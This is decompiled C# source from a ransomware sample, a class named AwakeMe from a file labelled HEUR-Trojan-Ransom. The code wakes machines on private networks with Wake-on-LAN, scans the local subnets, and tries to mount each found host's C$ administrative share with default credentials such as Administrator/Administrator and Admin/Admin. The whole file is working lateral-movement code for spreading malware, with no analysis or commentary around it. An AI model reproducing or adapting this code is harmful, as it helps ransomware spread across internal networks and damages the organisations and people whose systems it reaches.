// Decompiled with JetBrains decompiler
// Type: Complex.AwakeMe
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-ec405cc32f21680a9328c4360bd6dc5b660af66209669ca815bebceefb6c3b39.exe

using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Complex
{
  internal class AwakeMe
  {
    public static void Wake()
    {
      List<IPInfo> ipInfo1 = IPInfo.GetIPInfo();
      foreach (IPInfo ipInfo2 in ipInfo1)
      {
        try
        {
          if (ipInfo2.IPAddress.StartsWith("10.") || ipInfo2.IPAddress.StartsWith("172.16.") || ipInfo2.IPAddress.StartsWith("192.168."))
            WakeOnLan.WakeUp(ipInfo2.MacAddress, ipInfo2.IPAddress, "255.255.255.0");
        }
        catch
        {
        }
      }
      foreach (IPInfo ipInfo3 in ipInfo1)
      {
        try
        {
          Regex regex = new Regex(".");
          string[] strArray = new string[5]
          {
            regex.Split(ipInfo3.IPAddress)[0],
            ".",
            regex.Split(ipInfo3.IPAddress)[1],
            ".",
            regex.Split(ipInfo3.IPAddress)[2]
          };
          foreach (string str in NetScan.scan(string.Concat(strArray)))
          {
            if (ipInfo3.IPAddress.StartsWith("10.") || ipInfo3.IPAddress.StartsWith("172.16.") || ipInfo3.IPAddress.StartsWith("192.168."))
            {
              Program.ProcessCommand("cmd.exe", "\\c net use * \\\\" + str + "\\C$ /user:Administrator Administrator");
              Program.ProcessCommand("cmd.exe", "\\c net use * \\\\" + str + "\\C$ /user:Admin Admin");
            }
          }
        }
        catch
        {
        }
      }
    }
  }
}
